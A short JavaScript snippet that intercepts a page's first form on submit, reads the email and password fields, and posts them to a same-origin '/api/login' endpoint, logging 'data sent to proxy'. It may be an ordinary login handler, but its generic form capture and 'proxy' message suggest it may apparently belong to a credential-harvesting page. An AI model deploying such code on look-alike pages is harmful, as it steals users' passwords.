document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector('form'); 
    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = document.querySelector('input[name="email"]')?.value || "N/A";
            const password = document.querySelector('input[name="password"]')?.value || "N/A";

            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });
            
            console.log("data sent to proxy");
        });
    }
});